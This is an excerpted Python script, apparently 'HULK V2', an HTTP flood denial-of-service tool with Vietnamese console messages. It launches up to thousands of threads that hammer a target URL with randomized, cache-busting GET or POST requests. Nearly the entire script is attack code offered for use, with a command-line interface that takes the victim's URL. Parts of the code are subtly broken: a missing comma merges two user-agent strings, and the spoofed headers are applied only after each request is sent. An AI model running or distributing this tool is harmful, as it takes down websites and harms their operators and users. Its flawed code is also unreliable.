...
headersUseragents = [
    "Mozilla/5.0 (iphone x Build/MXB48T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.49 Mobile MQQBrowser/6.2 TBS/043632 Safari/537.36 MicroMessenger/6.6.1.1220(0x26060135) NetType/WIFI Language/zh_CN"        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246",
...
def http_call(url, host, data, headers, s):
    global cur
    cur += 1
    ...
    while True:
        try:
            if data == "":
                url_to_request = url + param_joiner + build_block(random.randint(3, 10)) + "=" + build_block(random.randint(3, 10))
                q = requests.get(url_to_request)
            else:
                q = requests.post(url, data=data)

            headers_to_set = {
                "User-Agent": random.choice(headersUseragents),
                "Cache-Control": "no-cache",
                "Accept-Charset": acceptCharset,
                "Referer": random.choice(headersReferers) + build_block(random.randint(5, 10)),
            ...
            for element in headers:
                words = element.split(":")
                headers_to_set[words[0].strip()] = words[1].strip()

            q.headers = headers_to_set
...
def attack(target_url):
    ...
    print("  -- Đã bắt đầu tấn công  --\n     HULK V2\n\n")
    print("    Đang sử dụng             |\tKết nối thành công |\tKết nối thất bại")

    while True:
        if cur < maxproc - 1:
            t = threading.Thread(target=http_call, args=(target_url, u.netloc, data, headers, ss))
            t.daemon = True
            t.start()

        if sent % 10 == 0:
            print("\r  %6d trong số tối đa %-6d |\t%7d |\t%6d" % (cur, maxproc, sent, err), end="")

        switch = ss.get()
        if switch == callExitOnErr:
            cur -= 1
            err += 1
        elif switch == callExitOnTooManyFiles:
            cur -= 1
            maxproc -= 1
            ...
            sent += 1
            print("\r  %-6d trong số tối đa %-6d |\t%7d |\t%6d" % (cur, maxproc, sent, err))
...
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HULK - HTTP Unbearable Load King")
    parser.add_argument("target_url", type=str, help="Target URL to attack")
    parser.add_argument("--max-procs", type=int, default=10240, help="Maximum number of concurrent processes (default: 10240)")
    parser.add_argument("--agents", type=str, help="File containing user-agent strings")
    parser.add_argument("--data", type=str, help="Data to POST. If present, HULK will use POST requests instead of GET")
    parser.add_argument("--safe", action="store_true", help="Autoshut after dos")
    parser.add_argument("--version", action="version", version="HULK V2 " + __version__)
    args = parser.parse_args()

    maxproc = args.max_procs

    u = urlparse(args.target_url)
    if args.agents:
        with open(args.agents, "r") as agents_file:
            headersUseragents = [line.strip() for line in agents_file]

    signal.signal(signal.SIGINT, sigint_handler)

    # Start the attack
    attack(args.target_url)
